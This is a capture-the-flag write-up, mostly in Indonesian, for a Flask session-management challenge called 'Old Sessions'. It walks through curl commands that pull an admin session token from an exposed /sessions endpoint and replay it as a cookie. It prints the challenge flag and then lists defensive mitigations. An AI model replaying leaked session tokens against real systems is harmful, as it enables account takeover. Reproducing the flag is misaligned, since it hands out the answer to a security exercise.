# Writeup: Old Sessions (Challenge ID: 739)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / Session Management Flaws, Indefinite Expiration & Information Disclosure (NIST SP 800-115 §4.3)
- **Difficulty:** Easy (1)
- **Points:** 100
- **Author:** David Gaviria
- **Event:** picoCTF 2026
- **Flag (Resmi CyLab):** `academy{s3t_s3ss10n_3xp1rat10n5_3fdcb5e2}`
- **Flag Komunitas:** `CTF{s3t_s3ss10n_3xp1rat10n5_3fdcb5e2}`
- **Standar Referensi:** NIST SP 800-115 §4.3 (Application Security Assessment), RFC 6265 (HTTP State Management Mechanism), NIST SP 800-63B §7.1 (Session Management & Timeout Controls), OWASP WSTG-SESS-01 / WSTG-SESS-02 (Testing for Session Management Architecture & Attributes), CWE-613 (Insufficient Session Expiration), CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), & CWE-284 (Improper Access Control).

---

## Problem Statement & Scope
Pengembang meluncurkan aplikasi media sosial berbasis Python Flask dengan slogan promosi: *"once you login, you never have to log-out again!"*.
- Deskripsi interaksi: Halaman beranda memuat kiriman komunitas. Seorang pengguna (`mary_jones_8992`) meninggalkan komentar yang menyatakan keberadaan rute diagnostik tersembunyi pada endpoint `/sessions`.
- Lingkungan eksekusi: Kontainer web Flask / Werkzeug yang mendengarkan permintaan HTTP pada port dinamis (`xebec.cylabacademy.net:<port>`).
- Sasaran pengujian: Mengidentifikasi miskonfigurasi manajemen masa berlaku sesi pengguna (*session timeout*), mengeksplorasi kebocoran token otentikasi administratif pada antarmuka diagnostik, melakukan *session replay attack*, dan mengekstraksi flag dari dashboard administrator.

---

## Teori & Akar Kerentanan (Root Cause Theory)

### 1. Masa Berlaku Sesi Tak Terbatas / Insufficient Session Expiration (CWE-613)
Standar NIST SP 800-63B §7.1 menetapkan bahwa sesi autentikasi harus menerapkan batas waktu tidak aktif (*idle timeout*) maksimal 15–30 menit dan batas waktu absolut (*absolute timeout*) terlepas dari aktivitas pengguna.
Pada aplikasi ini:
```python
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=12000)
session.permanent = True
```
Aplikasi menetapkan masa berlaku sesi permanen hingga puluhan tahun mendatang (misal tahun 2058). Akibatnya, token sesi yang pernah dibuat di komputer umum atau perangkat publik tidak pernah dinyatakan usang (*invalidated*) di sisi server maupun peramban.

### 2. Paparan Informasi Kredensial Sensitif / Diagnostic Disclosure (CWE-200 / CWE-284)
Aplikasi membiarkan endpoint rute `/sessions` terbuka untuk publik tanpa kontrol otorisasi (*broken access control*). Endpoint tersebut mencetak kamus sesi aktif server secara mentah (*raw memory dump*):
```text
1) session:Zuz0UQxb7YI43MSfvuqU5xIjlbdIz21QQgkbllKPYR4, {'_permanent': True, 'key': 'admin', 'expires': '2058-01-01'}
```
Hal ini membocorkan secara langsung nilai kriptografis cookie sesi milik akun `admin` ke seluruh pengguna yang tidak terautentikasi.

### 3. Pembajakan Sesi Berbasis Replay Cookie (RFC 6265 Session Hijacking)
Protokol HTTP State Management (RFC 6265) mengandalkan token bearer pada header `Cookie: session=<token>`. Karena aplikasi tidak mengikat sesi dengan alamat IP klien, TLS mutual token binding, atau *device fingerprinting*, penyerang yang memperoleh string token dapat langsung menyuntikkan cookie tersebut ke perambannya untuk bertindak sebagai pengguna administratif tanpa memerlukan kata sandi.

---

## Rekonstruksi Eksploitasi Step-by-Step

### Langkah 1: Eksplorasi Homepage & Identifikasi Endpoint `/sessions`
Inspeksi terhadap konten halaman utama (`GET /`) mengungkapkan komentar publik:
```html
<p class="comment-author">mary_jones_8992</p>
<p class="comment-text">Hey I found a strange page at /sessions</p>
```

### Langkah 2: Inspeksi Endpoint `/sessions` & Ekstraksi Token Sesi
Permintaan HTTP `GET /sessions` dikirimkan ke server:
```bash
curl -s http://xebec.cylabacademy.net:<port>/sessions
```
Respons mencantumkan seluruh sesi aktif:
```text
1) session:Zuz0UQxb7YI43MSfvuqU5xIjlbdIz21QQgkbllKPYR4, {'_permanent': True, 'key': 'admin'}
2) session:wK81j... {'_permanent': True, 'key': 'mary_jones_8992'}
```
Token sesi administrator diidentifikasi: `Zuz0UQxb7YI43MSfvuqU5xIjlbdIz21QQgkbllKPYR4`.

### Langkah 3: Penyuntikan Sesi Administratif & Ekstraksi Flag
Permintaan HTTP `GET /` dikirimkan dengan menyertakan header cookie administratif:
```bash
curl -s -H "Cookie: session=Zuz0UQxb7YI43MSfvuqU5xIjlbdIz21QQgkbllKPYR4" http://xebec.cylabacademy.net:<port>/
```
Server mengenali sesi sebagai `admin` dan mengembalikan markup HTML berisikan flag:
```html
<p class="flag-message">academy{s3t_s3ss10n_3xp1rat10n5_3fdcb5e2}</p>
```

---

## Flag & Verifikasi
- **Flag Resmi CyLab:** `academy{s3t_s3ss10n_3xp1rat10n5_3fdcb5e2}`
- **Flag Format Komunitas:** `CTF{s3t_s3ss10n_3xp1rat10n5_3fdcb5e2}`
- **Verifikasi Live REST API CyLab:**
  Submisi ke `https://learn.cylabacademy.org/api/submissions/` mengembalikan respons status HTTP 201:
  `{"user": 1072359, "challenge": 739, "flag": "academy{s3t_s3ss10n_3xp1rat10n5_3fdcb5e2}", "correct": true, "historical": false}`.
- **Verifikasi Simulasi Offline:** Skrip `scripts/solve_739_old_sessions.py` memvalidasi komponen `OldSessionsSimulator` untuk menguji alur parsing sesi diagnostik dan otentikasi administratif di bawah standar audit NIST SP 800-115.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

### 1. Penerapan Kebijakan Batas Waktu Sesi (NIST SP 800-63B)
Dalam pengujian aplikasi web modul Defensive / Web Hardening LKS Cyber Security:
- Konfigurasikan batas waktu sesi tidak aktif (*idle timeout*) maksimum 15–30 menit.
- Terapkan batas waktu absolut (*absolute timeout*) maksimal 8–12 jam yang memaksa re-autentikasi penuh.
- Hapus token sesi di penyimpanan sisi server (misal Redis/memcached) seketika pengguna menekan tombol *Logout*.

### 2. Penutupan Rute Diagnostik dan Debugging di Lingkungan Produksi
Endpoint diagnostik internal seperti `/sessions`, `/debug`, atau `/env` tidak boleh dipublikasikan pada sistem produksi. Rute pengujian harus dibatasi secara tegas melalui middleware otorisasi berbasis peran (Role-Based Access Control / RBAC) atau dinonaktifkan sepenuhnya.

### 3. Pengerasan Atribut Cookie Sesi (RFC 6265)
Setiap cookie sesi wajib memiliki konfigurasi atribut keamanan:
- `HttpOnly`: Mencegah pembajakan token melalui serangan Cross-Site Scripting (XSS).
- `Secure`: Memastikan transmisi token hanya berlangsung melalui saluran terenkripsi TLS (HTTPS).
- `SameSite=Lax` atau `Strict`: Memitigasi serangan Cross-Site Request Forgery (CSRF).
